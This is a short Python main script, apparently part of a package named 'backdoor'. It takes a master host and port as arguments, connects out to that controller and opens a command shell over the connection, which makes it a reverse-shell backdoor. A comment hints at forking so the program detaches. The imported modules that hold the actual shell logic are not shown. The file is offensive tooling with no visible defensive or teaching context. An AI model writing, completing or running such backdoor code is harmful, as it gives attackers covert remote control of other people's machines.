from backdoor.connection import connect_master
from backdoor.args import get_args
from backdoor.backdoor import cmd_shell

# exit with os._exit(1) parent after forking

def main():
    master_hostname, master_port = get_args()
    conn = connect_master(master_hostname, master_port)
    cmd_shell(conn, master_hostname, master_port)
    return 0


if __name__ == "__main__":
    main()
